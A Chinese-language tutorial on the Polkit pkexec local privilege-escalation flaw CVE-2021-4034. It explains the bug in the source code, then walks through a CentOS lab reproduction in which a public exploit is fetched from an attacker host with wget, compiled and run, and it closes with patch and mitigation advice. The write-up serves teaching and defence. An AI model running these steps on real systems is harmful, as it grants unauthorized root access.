[TOC]



# ==Linux下Poolkit提权==

教材内容

## Linux Polkit 权限提升漏洞（CVE-2021-4034）

### 一、漏洞简介

 2021年，Qualys研究团队公开披露了在Polkit的pkexec 中发现的一个权限提升漏洞，也被称为PwnKit。该漏洞是由于pkexec 没有正确处理调用参数，导致将环境变量作为命令执行，攻击者可以通过构造环境变量的方式，诱使pkexec执行任意代码使得非特权本地用户获取到root的权限。

影响范围（受影响的主流Linux发行版本）：

 Ubuntu 21.10 (Impish Indri) policykit-1 < 0.105-31ubuntu0.1
​ Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)
​ Ubuntu 20.04 LTS (Focal Fossa) policykit-1 < Released (0.105-26ubuntu1.2)
​ Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 < Released (0.105-20ubuntu0.18.04.6)
​ Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 < Released (0.105-14.1ubuntu0.5+esm1)
​ Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 < Released (0.105-4ubuntu3.14.04.6+esm1)
​ CentOS 6 polkit < polkit-0.96-11.el6_10.2
​ CentOS 7 polkit < polkit-0.112-26.el7_9.1
​ CentOS 8.0 polkit < polkit-0.115-13.el8_5.1
​ CentOS 8.2 polkit < polkit-0.115-11.el8_2.2
​ CentOS 8.4 polkit < polkit-0.115-11.el8_4.2
​ Debain stretch policykit-1 < 0.105-18+deb9u2
​ Debain buster policykit-1 < 0.105-25+deb10u1
​ Debain bookworm, bullseye policykit-1 < 0.105-31.1

### 二、漏洞原理

#### 2.1 Polkit

 Polkit（PolicyKit）是类Unix系统中一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯。pkexec是Polkit开源应用框架的一部分，可以使授权非特权用户根据定义的策略以特权用户的身份执行命令。

#### 2.2 原理分析

 该漏洞主要是使用pkexec加载恶意的so文件来进行提权，这里使用的是polkit-0.120的源码进行分析。下载地址为：https://www.freedesktop.org/software/polkit/releases/polkit-0.120.tar.gz 。

 src/programs/pkexec.c的部分代码如下：

```
435 main (int argc, char *argv[])
436 {
...
534   for (n = 1; n < (guint) argc; n++)
535     {
...
568     }
...
610   path = g_strdup (argv[n]);
...629   if (path[0] != '/')
630     {
...
632       s = g_find_program_in_path (path);
...
639       argv[n] = path = s;
640     }
```

435行：main函数，两个参数含义如下：

- argc （argument count）：表示传入main函数中参数的个数，包括这个程序本身。
- argv（argument vector）：表示传入main函数中的参数列表，其中argv[0]是这个函数的名称。

534-568行：main函数处理命令行参数。

610-640 行：在 PATH 环境变量的目录中搜索要执行的程序，如果其路径不是绝对路径（path[0] != ‘/‘），则argv[n] = path = s。

 若我们让argc为0，即传入的参数为空，则会出现以下情况：

 第534行：n被赋值为1。

 第610行：argv[n] （此时为argv[1]）将会越界读取指针路径。

 第639行：指针s被越界写入argv[1]的内容。

而要知道这个越界的argv[1]读写的什么内容，我们就必须得了解execve函数，其原型如下：

```
int execve(const char *filename, char *const argv[], char *const envp[]);
```

当使用execve()函数启动一个新程序时，内核将参数、环境变量字符串以及指针（argv与envp）复制到新程序堆栈的末尾。如使用其启动pkexec，则execve(“/usr/bin/pkexec”,{“program”,”-option”,…},{“value”,”PATH=name”,…})的内存布局如下图：

![image-20220819154713540](https://gitee.com/ymq_typroa/typroa/raw/main/20220819154720.png)

由上图可知，argv和envp指针在内存中是连续的，若argc为0，则argv[1]指向的就是envp[0]，就是第一个环境变量“value”。继续前面的分析：

 第610行：将要执行的程序的路径从argv[1]（即envp[0]）中越界读取，并指向“value”。

 第632行：这个路径“value”被传递给 g_find_program_in_path函数，在 PATH 环境变量的目录中搜索一个名为“value”的可执行文件；如果找到这样的可执行文件，则将其完整路径返回给pkexec第 632 行的指针s；

 第639行：这个完整路径被越界写入argv[1]（即envp[0]），从而覆盖了我们的第一个环境变量。

但是在670行对环境变量进行了校验，防止引入危险的环境变量。

![image-20220819171314363](https://gitee.com/ymq_typroa/typroa/raw/main/20220819171314.png)

该validate_environment_variable() 函数部分代码如下：

![image-20220819170743220](https://gitee.com/ymq_typroa/typroa/raw/main/20220819170743.png)

其中使用了g_printerr()函数打印错误消息，该函数调用了glibc的函数iconv_open()函数。iconv_open()函数使用时首先会找到系统提供的gconv-modules文件（这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置）。然后再根据gconv-modules文件的指示去链接参数对应的.so文件。

而GCONV_PATH这个环境变量可以修改指向gconv-modules的位置，也就是说如果攻击者控制了GCONV_PATH就可以让iconv_open找到攻击者构造的gconv-modules，让其执行指定的.so文件内的特定函数来进行提权。

### 三、漏洞复现

#### 3.1 实验环境

 操作系统：Centos7.9（镜像地址：https://mirrors.tuna.tsinghua.edu.cn/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso）

 普通用户：zhangsan

 漏洞利用工具：https://github.com/berdav/CVE-2021-4034

#### 3.2 复现过程

1. 下载漏洞利用工具，这里现将工具压缩包下载值kali，在kali上用python开启web服务，来让被攻击主机下载。

   ```
    wget http://192.168.219.134:8000/CVE-2021-4034-main.zip
   ```

2. 压缩，编译，利用。

   ```
    unzip CVE-2021-4034-main.zip 
    cd CVE-2021-4034-main 
    make 
    ./cve-2021-4034
   ```

![image-20220819174511792](https://gitee.com/ymq_typroa/typroa/raw/main/20220819174511.png)

 提权成功。

### 四、修复建议

1. 更新官方补丁，下载地址：https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683

2. 根据不同厂商的修复建议或安全通告进行防护。

   Redhat：https://access.redhat.com/security/cve/CVE-2021-4034

   Ubuntu：https://ubuntu.com/security/CVE-2021-4034

   Debian：https://security-tracker.debian.org/tracker/CVE-2021-4034

3. 临时防护可以移除 pkexec 的 suid位。

   ```
    chmod 0755 /usr/bin/pkexec
   ```

### 五、参考文章

1. CVE-2021-4034 Linux Polkit 权限提升漏洞挖掘思路解读（https://cloud.tencent.com/developer/article/1940677）。
2. SUID提权：CVE-2021-4034漏洞全解析（https://www.cnblogs.com/northeast-coder/p/15925463.html）。
3. CVE-2021-0434 详解 exp编写 复现（https://www.cnblogs.com/ash-33/p/16118713.html）。
4. CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复（https://blog.csdn.net/laobanjiull/article/details/122715651）。
5. PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) （https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034）。